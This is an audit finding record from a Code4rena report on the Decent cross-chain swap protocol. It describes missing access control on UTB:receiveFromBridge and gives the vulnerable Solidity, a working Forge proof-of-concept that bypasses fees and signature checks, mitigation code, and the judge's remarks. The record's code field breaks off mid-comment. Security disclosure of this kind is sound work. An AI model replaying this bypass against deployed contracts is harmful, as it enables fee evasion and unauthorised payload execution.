{
  "Title": "[M-03] Missing access control on UTB:receiveFromBridge allows UTB swaps to be executed without spending bridge fees while bypassing fee/swap instruction signature verification",
  "Content": "\nUsers can abuse the public [`UTB:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L311) function's lack of access control to directly call the internal [`UTB:_swapAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L134) function.\n\nThis bypasses the [`UTB:retrieveAndCollectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L228) modifier, which is used to collect fees from UTB users and validate fee and swap instructions via [`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44) in all other public swap/bridge functions (namely [`UTB:swapAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L115) and [`UTB:bridgeAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L266)).\n\nThis allows users to execute inter-chain swaps without spending bridge fees, using instructions that have not been signed by a validator key. Unsigned additional payloads can also be included in the swap instruction's `payload` element, which would then be executed by the [`UTBExecutor:execute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBExecutor.sol#L19) function.\n\n### Root Cause\n\n### Missing access control in `UTB:receiveFromBridge`\n\n`UTB:receiveFromBridge` is likely missing an access control modifier.\n\nNote that the missing modifier may not be the \\[`UTB:retrieveAndCollectFees`] modifier, as this modifier is understood to be intended for checking the UTB swap/bridge instructions on the source chain. Refer to the remedial suggestions for an alternate means of access control.\n\n**[`UTB:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L311)**\n\n<details>\n\n```solidity\n\n//File:src/UTB.sol\n\ncontract UTB is Owned {\n\n    ...\n\n    function receiveFromBridge(\n        SwapInstructions memory postBridge,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) public { // missing retrieveAndCollect modifier\n        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);\n    }\n\n    ...\n\n    // if a feeCollector has been set, then this modifier validates the fee struct against the signer:\n\n    modifier retrieveAndCollectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes calldata signature\n    ) {\n        if (address(feeCollector) != address(0)) {\n            uint value = 0;\n            if (fees.feeToken != address(0)) {\n                IERC20(fees.feeToken).transferFrom(\n                    msg.sender,\n                    address(this),\n                    fees.feeAmount\n                );\n                IERC20(fees.feeToken).approve(\n                    address(feeCollector),\n                    fees.feeAmount\n                );\n            } else {\n                value = fees.feeAmount;\n            }\n            feeCollector.collectFees{value: value}(fees, packedInfo, signature);\n        }\n        _;\n    }\n\n    ...\n    \n    // swapAndExecute/bridgeAndExecute functions both validate fees/instructions signatures via retrieveAndCollectFees modifier\n\n    function swapAndExecute(\n        SwapAndExecuteInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n    {\n        _swapAndExecute(\n            instructions.swapInstructions,\n            instructions.target,\n            instructions.paymentOperator,\n            instructions.payload,\n            instructions.refund\n        );\n    }\n\n    function bridgeAndExecute(\n        BridgeInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n        returns (bytes memory)\n    {\n        (\n            uint256 amt2Bridge,\n            BridgeInstructions memory updatedInstructions\n        ) = swapAndModifyPostBridge(instructions);\n        return callBridge(amt2Bridge, fees.bridgeFee, updatedInstructions);\n    }\n\n    ...\n\n    // _swapAndExecute directly bypasses any signature/fee checks before the swap/payload is executed.\n\n    function _swapAndExecute(\n        SwapInstructions memory swapInstructions,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) private {\n        (address tokenOut, uint256 amountOut) = performSwap(swapInstructions);\n        if (tokenOut == address(0)) {\n            executor.execute{value: amountOut}(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        } else {\n            IERC20(tokenOut).approve(address(executor), amountOut);\n            executor.execute(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        }\n    }\n\n}\n```\n</details>\n\n**[`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44)**\n\n<details>\n\n```solidity\n\n//File:src/UTBFeeCollector.sol\n\n    function collectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes memory signature\n    ) public payable onlyUtb {\n        bytes32 constructedHash = keccak256(\n            abi.encodePacked(BANNER, keccak256(packedInfo))\n        );\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);\n        address recovered = ecrecover(constructedHash, v, r, s);\n        require(recovered == signer, \"Wrong signature\");\n        if (fees.feeToken != address(0)) {\n            IERC20(fees.feeToken).transferFrom(\n                utb,\n                address(this),\n                fees.feeAmount\n            );\n        }\n    }\n```\n\n</details>\n\n**[`UTBExecutor:execute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBExecutor.sol#L19)**\n\n<details>\n\n```solidity\n\n//File:src/UTBExecutor.sol:\n\ncontract UTBExecutor is Owned {\n   \n    ...\n\n    function execute(\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address token,\n        uint amount,\n        address payable refund\n    ) public payable onlyOwner {\n        return\n            execute(target, paymentOperator, payload, token, amount, refund, 0);\n    }\n\n    ...\n\n    function execute(\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address token,\n        uint amount,\n        address payable refund,\n        uint extraNative\n    ) public onlyOwner {\n        bool success;\n        if (token == address(0)) {\n            (success, ) = target.call{value: amount}(payload);\n            if (!success) {\n                (refund.call{value: amount}(\"\"));\n            }\n            return;\n        }\n\n        uint initBalance = IERC20(token).balanceOf(address(this));\n\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n        IERC20(token).approve(paymentOperator, amount);\n\n        if (extraNative > 0) {\n            (success, ) = target.call{value: extraNative}(payload);\n            if (!success) {\n                (refund.call{value: extraNative}(\"\"));\n            }\n        } else {\n            (success, ) = target.call(payload);\n        }\n\n        uint remainingBalance = IERC20(token).balanceOf(address(this)) -\n            initBalance;\n\n        if (remainingBalance == 0) {\n            return;\n        }\n\n        IERC20(token).transfer(refund, remainingBalance);\n    }\n}\n\n```\n\n</details>\n\n### Proof of Concept\n\nThe following Forge PoC test suite includes the following tests which demonstrates this issue, against a UTB/decent-bridge deployment on the Arbitrum and Polygon network chains, deployed via the provided helper functions in the repo test suite.\n\n**`UTBReceiveFromBridge` Forge test contract:**\n\n<details>\n\n```solidity\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {UTB, SwapInstructions, SwapAndExecuteInstructions, FeeStructure} from \"../src/UTB.sol\";\nimport {UTBExecutor} from \"../src/UTBExecutor.sol\";\nimport {UniSwapper} from \"../src/swappers/UniSwapper.sol\";\nimport {SwapParams} from \"../src/swappers/SwapParams.sol\";\nimport {XChainExactOutFixture} from \"./helpers/XChainExactOutFixture.sol\";\nimport {UTBCommonAssertions} from \"../test/helpers/UTBCommonAssertions.sol\";\nimport '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {IDcntEth} from \"lib/decent-bridge/src/interfaces/IDcntEth.sol\";\nimport {IDecentBridgeExecutor} from \"lib/decent-bridge/src/interfaces/IDecentBridgeExecutor.sol\";\nimport {IDecentEthRouter} from \"lib/decent-bridge/src/interfaces/IDecentEthRouter.sol\";\nimport {DcntEth} from \"lib/decent-bridge/src/DcntEth.sol\";\nimport {DecentBridgeExecutor} from \"lib/decent-bridge/src/DecentBridgeExecutor.sol\";\nimport {DecentEthRouter} from \"lib/decent-bridge/src/DecentEthRouter.sol\";\nimport {IUTB} from \"../src/interfaces/IUTB.sol\";\nimport {IUTBExecutor} from \"../src/interfaces/IUTBExecutor.sol\";\nimport {IUTBFeeCollector} from \"../src/interfaces/IUTBFeeCollector.sol\";\nimport {LzChainSetup} from \"lib/forge-toolkit/src/LzChainSetup.sol\";\nimport {console2} from \"forge-std/Test.sol\";\nimport {VmSafe} from \"forge-std/Vm.sol\";\n\ncontract UTBReceiveFromBridge is XChainExactOutFixture {\n\n    UTB src_utb;\n    UTB dst_utb;\n    UniSwapper src_swapper;\n    UniSwapper dst_swapper;\n    DecentEthRouter src_DecentEthRouter;\n    DecentEthRouter dst_DecentEthRouter;\n    IDcntEth src_IDcntEth;\n    address src_weth; \n    address src_usdc; \n    address dst_weth;\n    address dst_usdc;\n    uint256 slippage = 1;\n    uint256 FEE_AMOUNT = 0.01 ether;\n    CalledPOC ap;\n\n    function setUp() public {\n        src = arbitrum;\n        dst = polygon;\n        preSlippage = 2;\n        postSlippage = 3;\n        initialEthBalance = 1 ether;\n        initialUsdcBalance = 10e6;\n        MINT_GAS = 9e5;\n        setRuntime(ENV_FORGE_TEST);\n        loadAllChainInfo();\n        setupUsdcInfo();\n        setupWethHelperInfo();\n        loadAllUniRouterInfo();\n        setSkipFile(true);\n        vm.label(alice, \"alice\");\n        vm.label(bob, \"bob\");\n        src_weth = getWeth(src);\n        src_usdc = getUsdc(src);\n        dst_weth = getWeth(dst);\n        dst_usdc = getUsdc(dst);\n        feeAmount = FEE_AMOUNT;\n        _setupXChainUTBInfra();\n        _srcChainSetup();\n        // start all activities in src chain by default\n        switchTo(src);\n        ap = new CalledPOC();\n    }\n\n    function _setupXChainUTBInfra() internal {\n        (src_utb,,src_swapper,src_DecentEthRouter,,) = deployUTBAndItsComponents(src);\n        (dst_utb,,dst_swapper,dst_DecentEthRouter,,) = deployUTBAndItsComponents(dst);\n        wireUpXChainUTB(src, dst);\n    }\n\n    function _srcChainSetup() internal {\n        dealTo(src, alice, initialEthBalance);\n        mintUsdcTo(src, alice, initialUsdcBalance);\n        mintWethTo(src, alice, initialEthBalance);\n        cat = deployTheCat(src);\n        catUsdcPrice = cat.price();\n        catEthPrice = cat.ethPrice();\n    }\n\n    function _setupAndGetInstructionsFeesSignature() internal returns(\n        SwapAndExecuteInstructions memory,\n        FeeStructure memory,\n        bytes memory){\n        (SwapParams memory swapParams, uint expected) = getSwapParamsExactOut(\n            src,\n            src_weth,\n            src_usdc,\n            catUsdcPrice,\n            slippage\n        );\n        address payable refund = payable(alice);\n        SwapInstructions memory swapInstructions = SwapInstructions({\n            swapperId: src_swapper.getId(),\n            swapPayload: abi.encode(swapParams, address(src_utb), refund)\n        });\n        startImpersonating(alice);\n        ERC20(src_weth).approve(address(src_utb), swapParams.amountIn);\n        SwapAndExecuteInstructions\n            memory instructions = SwapAndExecuteInstructions({\n                swapInstructions: swapInstructions,\n                target: address(cat),\n                paymentOperator: address(cat),\n                refund: refund,\n                payload: abi.encodeCall(cat.mintWithUsdc, (bob))\n            });\n\n        (   bytes memory signature,\n            FeeStructure memory fees\n        ) = getFeesAndSignature(instructions);\n        stopImpersonating();\n        return (instructions, fees, signature);\n    }\n\n    /*\n    Testing correct UTB fee collection/signature validation during normal swap. \n    Adapted from UTBExactOutRoutesTest:testSwapWethToUsdcAndMintAnNft\n    */\n    function testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFees() public {\n        (SwapAndExecuteInstructions memory _instructions,\n        FeeStructure memory _fees,\n        bytes memory _signature) = _setupAndGetInstructionsFeesSignature();\n        startImpersonating(alice);\n        uint256 aliceETHBalanceBefore = address(alice).balance;\n        src_utb.swapAndExecute{value: feeAmount}(_instructions, _fees, _signature);\n        stopImpersonating();\n        // confirm alice has spent feeAmount\n        assertEq(address(alice).balance, aliceETHBalanceBefore - feeAmount);\n        // confirm bob got the NFT\n        assertEq(cat.balanceOf(bob), 1);\n        assertEq(ERC20(src_usdc).balanceOf(address(cat)), cat.price());\n        // checking fees\n        address feeCollector = address(feeCollectorLookup[src]);\n        if (feeToken == address(0)) {\n            // expect src feeCollector balance to be the feeAmount\n            assertEq(feeCollector.balance, feeAmount);\n        } else {\n            assertEq(ERC20(feeToken).balanceOf(feeCollector), feeAmount);\n        }\n    }\n\n    /*\n    Missing access control on UTB:receiveFromBridge allows UTB swaps to be executed while bypassing fee/swap instruction signature verification. \n    */\n    function testUTBReceiveFromBridge_BypassFeesAndSignature() public {\n        /* getting the SwapAndExecuteInstructions struct for \n        swapping WETH to USDC and minting bob a VeryCoolCat NFT.\n        FeeStructure and signature are not necessary this time.\n        */\n        (SwapAndExecuteInstructions memory _instructions,,) = _setupAndGetInstructionsFeesSignature();\n        // checking feeCollector to see if it has receievd any fees\n        address feeCollector = address(feeCollectorLookup[src]);\n        uint256 aliceETHBalanceBefore = address(alice).balance;\n        uint256 feeCollectorETHBalanceBefore = address(feeCollector).balance;\n         startImpersonating(alice);\n        /* use UTB:receiveFromBridge to directly call UTB:_swapAndExecute,\n         bypassing UTB:retrieveAndCollectFees modifier to send tx without fees or signature\n         with arbitrary additional payload.*/\n        src_utb.receiveFromBridge(\n            _instructions.swapInstructions,\n            _instructions.target,\n            _instructions.paymentOperator,\n            _instructions.payload,\n            _instructions.refund);\n        stopImpersonating();\n        // confirm alice has not spent any ETH/fees\n        assertEq(address(alice).balance, aliceETHBalanceBefore);\n        // confirm bob got the NFT\n        assertEq(cat.balanceOf(bob), 1);\n        assertEq(ERC20(src_usdc).balanceOf(address(cat)), cat.price());\n        if (feeToken == address(0)) {\n            // expect src feeCollector ETH balance not to change. In this case, it is 0\n            assertEq(feeCollector.balance, feeCollectorETHBalanceBefore); \n            assertEq(feeCollector.balance, 0); \n        } else {\n            assertEq(ERC20(feeToken).balanceOf(feeCollector), 0);\n        }\n    }\n\n    /* Showing arbitrary calldata being executed in SwapAndExecuteInstructions.payload \n    by using UTB:receiveFromBridge to send an unsigned swap for 0 amount with no fees*/\n    function testUTBReceiveFromBridge_ArbitraryCalldata() public {\n        // arg: SwapInstructions memory postBridge\n        (SwapParams memory swapParams, uint expected) = getSwapParamsExactOut(\n            src, // string memory chain\n            src_weth, // address tokenIn/tokenOut can be the same.\n            src_weth, // address tokenOut\n            0, // uitn256 amountOut can be zero\n            slippage // uint256 slippage\n        );\n        // arg: address payable refund\n        address payable refund = payable(alice); \n        // get SwapInstructions for SwapAndExecuteInstructions\n        SwapInstructions memory swapInstructions = SwapInstructions({\n            swapperId: src_swapper.getId(),\n            swapPayload: abi.encode(swapParams, address(src_utb), refund)\n        });\n        startImpersonating(alice);\n        //get SwapAndExecuteInstructions\n        SwapAndExecuteInstructions\n        memory _instructions = SwapAndExecuteInstructions({\n            swapInstructions: swapInstructions,\n            target:address(ap), // will be sending funds to alice on DST\n            paymentOperator: address(alice), // address UTBExecutor approves\n            refund: payable(address(alice)),\n            // make arbitrary call\n            payload: abi.encodeCall(ap.called, ())\n        });\n        // start recording for events\n        vm.recordLogs();\n        /* use UTB:receiveFromBridge to directly call UTB:_swapAndExecute,\n        bypassing UTB:retrieveAndCollectFees modifier to send tx without fees or signature\n        with arbitrary additional payload.*/\n        src_utb.receiveFromBridge(\n            _instructions.swapInstructions,\n            _instructions.target,\n            _instructions.paymentOperator,\n            _instructions.payload,\n            _instructions.refund);\n        stopImpersonating();\n        // capture emitted events\n        VmSafe.Log[] memory entries = vm.getRecordedLogs();\n        for (uint i = 0; i < entries.length; i++) {\n        if (entries[i].topics[0] == keccak256(\"Called(string)\")) {\n            // assert that the event data contains the POC contract's string.\n            assertEq(abi.decode(entries[i].data, (string)), \n            \"POC contract called\");\n            }   \n        }\n    }\n}\n\n// simple test contract to register an event if called() is called.\ncontract CalledPOC {\n\n    event Called(string);\n\n    constructor() payable {}\n    function called() public payable {\n        emit Called(\"POC contract called\");\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n}\n\n```\n\n</details>\n\nTests:\n\n*   `testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFee`: A benign test function to ensure normal swaps with fees are working as intended, where Alice executes a signed inter-chain swap between WETH and USDC before minting a VeryCoolCat test NFT to Bob. Adapted from the [`UTBExactOutRoutesTest:testSwapWethToUsdcAndMintAnNft` test](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/test/UTBExactOutRoutesTestEth2Eth.t.sol#L31).\n*   `testUTBReceiveFromBridge_BypassFeesAndSignature`: Demonstrating the issue by using the same swap with fee payload used in the `testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFee` test, sent through the `UTB:receiveFromBridge` function.\n*   `testUTBReceiveFromBridge_ArbitraryCalldata`: Demonstrating the issue by causing arbitrary unsigned calldata to be executed via the `UTB:receiveFromBridge` function. Note that a swap between the same WETH token, for amount 0, was used as the swap instructions for this test for clarity.\n\n**PoC instructions:**\n\n*   Clone and set up the [`audit repo`](https://github.com/code-423n4/2024-01-decent) repo and `.env` file as noted in [`Tests`](https://github.com/code-423n4/2024-01-decent?tab=readme-ov-file#tests)\n*   Add the Forge test suite file, `UTBReceiveFromBridge.t.sol`, to the repo's [`/test` directory.](https://github.com/code-423n4/2024-01-decent/tree/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/test)\n*   Run the following command to validate all tests:\n\n```\n❯ forge test --match-test testUTBReceiveFromBridge_\n[⠒] Compiling...No files changed, compilation skipped\n[⠢] Compiling...\n\nRunning 3 tests for test/UTBReceiveFromBridge.t.sol:UTBReceiveFromBridge\n[PASS] testUTBReceiveFromBridge_ArbitraryCalldata() (gas: 169476)\n[PASS] testUTBReceiveFromBridge_BypassFeesAndSignature() (gas: 678548)\n[PASS] testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFees() (gas: 703800)\nTest result: ok. 3 passed; 0 failed; 0 skipped; finished in 24.86s\n \nRan 1 test suites: 3 tests passed, 0 failed, 0 skipped (3 total tests)\n\n```\n\n### Tools Used\n\nFoundry, VSCode\n\n### Recommended Mitigation Steps\n\n### Primary Recommendation: Implement a robust access control modifier on the `UTB:receiveFromBridge` function to restrict access to known bridge adaptor addresses\n\nThe `UTB:receiveFromBridge` function appears to be intended to be called by the [`DecentBridgeAdapter:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/DecentBridgeAdapter.sol#L147) and [`StargateBridgeAdapter:sgReceive`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/StargateBridgeAdapter.sol#L209) functions. These functions are protected by the [`BaseAdapter:onlyExecutor`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/BaseAdapter.sol#L11) modifier. No other calls to \\[`UTB:receiveFromBridge`] are made in the audit codebase.\n\nIt therefore may be suitable to introduce a similar `onlyBridgeAdapter` modifier to `UTB`, using the already present [`UTB:bridgeAdapters`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L22) mapping to filter calls from only allowlisted bridge adaptors:\n\n```solidity\n\n    //File:src/UTB.sol\n    ...\n\n    modifier onlyBridgeAdapter(){\n        require(bridgeAdapters[IBridgeAdapter(msg.sender).getId()] != address(0), \"invalid bridge adaptor\");\n        _;\n    }\n\n    function receiveFromBridge(\n        SwapInstructions memory postBridge,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) public onlyBridgeAdapter() {\n        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);\n    }\n    ...\n```\n\n### Best practices: Review off-chain validator signature generation and update UTBFeeCollector:collectFees to allow for on-chain validation of signatures if [`UTB:feeCollector`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L19) has not been set.\n\nNote that in the `receiveFromBridge` modifier, fee and swap instructions are only validated if a `feeCollector` is set in `UTB`.\n\n**[`UTB:retrieveAndCollectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L228)**\n\n```solidity\n\n//File:src/UTB.col\n\n    modifier retrieveAndCollectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes calldata signature\n    ) {\n        if (address(feeCollector) != address(0)) { \n            \n            // if feeCollector has not been set, then signature verifcation does not occur\n\n            ...\n\n            feeCollector.collectFees{value: value}(fees, packedInfo, signature);\n        }\n        _;\n    }\n\n```\n\n**[`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44)**\n\n```solidity\n\n//File:src/UTBFeeCollector.sol\n\n    function collectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes memory signature\n    ) public payable onlyUtb {\n        bytes32 constructedHash = keccak256(\n            abi.encodePacked(BANNER, keccak256(packedInfo))\n        );\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature); // validating both fees and swap instructions with signature from signer\n        address recovered = ecrecover(constructedHash, v, r, s);\n        require(recovered == signer, \"Wrong signature\");\n\n        ...\n    }\n```\n\nIt is not known whether this is an intended design choice, possibly stemming from the way any off-chain swap/bridge/fee instruction validator APIs generate signatures and the fact that one signature is expected for both fee content and swap/bridge instructions.\n\nHowever, if swaps/bridge operations are intended to ever be called without incurring a fee via UTBFeeCollector, it is recommended for off-chain APIs to generate swap/bridge operation signatures with a fee amount of 0 in the case where fees are not intended to be collected for signed swap/bridge operations.\n\nThis would allow the [`feecollector.collectFees` line](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L248) in `UTB` to be placed outside of the [`if` check on the `feeCollector` address](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L233).\n\nAlternatively, it is recommended to separate signature verification of fee and swap/bridge instructions in both the API and the UTBFeeCollector contract, to allow their associated signatures to be validated independently.\n\nThis would ensure that signed swap/bridge instructions can be verified before execution, in the event that a UTBFeeCollector contract is not set for a particular chain/UTB deployment.\n\n**[0xsomeone (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/590#issuecomment-1925312126):**\n > This and its duplicate submissions have illustrated that the `UTB::receiveFromBridge` will behave identically to the `UTB::swapAndExecute` function albeit with no fees applied or signatures validated, permitting users to bypass these measures.\n> \n> The maximum impact of this and relevant submissions is the loss of fees that are meant to be imposed when the `UTB::swapAndExecute` functionality is utilized. As a subset of submissions has recognized, the signature validation is also bypassed permitting arbitrary payloads to be executed which is also considered unwanted with an unquantifiable impact.\n> \n> Given that the `UTB::swapAndExecute` is one of the main features of the protocol, I consider a medium-risk severity for this exhibit to be more appropriate. \n> \n> This submission has been selected as the best due to going in great detail in relation to the submission, however, it should be noted that the recommended alleviation suffers from impersonation attacks (i.e. results from getter functions on the `msg.sender` can be spoofed) and a `mapping` based whitelist mechanism should be enforced instead.\n\n**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/590#issuecomment-1942658993)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-01-decent",
  "Code": [
    {
      "filename": "src/UTB.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {SwapParams} from \"./swappers/SwapParams.sol\";\nimport {IUTBExecutor} from \"./interfaces/IUTBExecutor.sol\";\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\nimport {IWETH} from \"decent-bridge/src/interfaces/IWETH.sol\";\nimport {IUTBFeeCollector} from \"./interfaces/IUTBFeeCollector.sol\";\nimport {IBridgeAdapter} from \"./interfaces/IBridgeAdapter.sol\";\nimport {ISwapper} from \"./interfaces/ISwapper.sol\";\nimport {SwapInstructions, FeeStructure, BridgeInstructions, SwapAndExecuteInstructions} from \"./CommonTypes.sol\";\n\n\ncontract UTB is Owned {\n    constructor() Owned(msg.sender) {}\n\n    IUTBExecutor executor;\n    IUTBFeeCollector feeCollector;\n    IWETH wrapped;\n    mapping(uint8 => address) public swappers;\n    mapping(uint8 => address) public bridgeAdapters;\n\n    /**\n     * @dev Sets the executor.\n     * @param _executor The address of the executor.\n     */\n    function setExecutor(address _executor) public onlyOwner {\n        executor = IUTBExecutor(_executor);\n    }\n\n    /**\n     * @dev Sets the wrapped native token.\n     * @param _wrapped The address of the wrapped token.\n     */\n    function setWrapped(address payable _wrapped) public onlyOwner {\n        wrapped = IWETH(_wrapped);\n    }\n\n    /**\n     * @dev Sets the fee collector.\n     * @param _feeCollector The address of the fee collector.\n     */\n    function setFeeCollector(address payable _feeCollector) public onlyOwner {\n        feeCollector = IUTBFeeCollector(_feeCollector);\n    }\n\n    /**\n     * @dev Performs a swap with a default setting to retrieve ERC20.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions\n    ) private returns (address tokenOut, uint256 amountOut) {\n        return performSwap(swapInstructions, true);\n    }\n\n    /**\n     * @dev Performs a swap with the requested swapper and swap calldata.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param retrieveTokenIn Flag indicating whether to transfer ERC20 for the swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions,\n        bool retrieveTokenIn\n    ) private returns (address tokenOut, uint256 amountOut) {\n        ISwapper swapper = ISwapper(swappers[swapInstructions.swapperId]);\n\n        SwapParams memory swapParams = abi.decode(\n            swapInstructions.swapPayload,\n            (SwapParams)\n        );\n\n        if (swapParams.tokenIn == address(0)) {\n            require(msg.value >= swapParams.amountIn, \"not enough native\");\n            wrapped.deposit{value: swapParams.amountIn}();\n            swapParams.tokenIn = address(wrapped);\n            swapInstructions.swapPayload = swapper.updateSwapParams(\n                swapParams,\n                swapInstructions.swapPayload\n            );\n        } else if (retrieveTokenIn) {\n            IERC20(swapParams.tokenIn).transferFrom(\n                msg.sender,\n                address(this),\n                swapParams.amountIn\n            );\n        }\n\n        IERC20(swapParams.tokenIn).approve(\n            address(swapper),\n            swapParams.amountIn\n        );\n\n        (tokenOut, amountOut) = swapper.swap(swapInstructions.swapPayload);\n\n        if (tokenOut == address(0)) {\n            wrapped.withdraw(amountOut);\n        }\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param instructions The token swap data and payment transaction payload.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    function swapAndExecute(\n        SwapAndExecuteInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n    {\n        _swapAndExecute(\n            instructions.swapInstructions,\n            instructions.target,\n            instructions.paymentOperator,\n            instructions.payload,\n            instructions.refund\n        );\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA which initiated the transaction.\n     */\n    function _swapAndExecute(\n        SwapInstructions memory swapInstructions,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) private {\n        (address tokenOut, uint256 amountOut) = performSwap(swapInstructions);\n        if (tokenOut == address(0)) {\n            executor.execute{value: amountOut}(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        } else {\n            IERC20(tokenOut).approve(address(executor), amountOut);\n            executor.execute(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        }\n    }\n\n    /**\n     * @dev Performs the pre bridge swap and modifies the post bridge swap to utilize the bridged amount.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     */\n    function swapAndModifyPostBridge(\n        BridgeInstructions memory instructions\n    )\n        private\n        returns (\n            uint256 amount2Bridge,\n            BridgeInstructions memory updatedInstructions\n        )\n    {\n        (address tokenOut, uint256 amountOut) = performSwap(\n            instructions.preBridge\n        );\n\n        SwapParams memory newPostSwapParams = abi.decode(\n            instructions.postBridge.swapPayload,\n            (SwapParams)\n        );\n\n        newPostSwapParams.amountIn = IBridgeAdapter(\n            bridgeAdapters[instructions.bridgeId]\n        ).getBridgedAmount(amountOut, tokenOut, newPostSwapParams.tokenIn);\n\n        updatedInstructions = instructions;\n\n        updatedInstructions.postBridge.swapPayload = ISwapper(swappers[\n            instructions.postBridge.swapperId\n        ]).updateSwapParams(\n            newPostSwapParams,\n            instructions.postBridge.swapPayload\n        );\n\n        amount2Bridge = amountOut;\n    }\n\n    /**\n     * @dev Checks if the 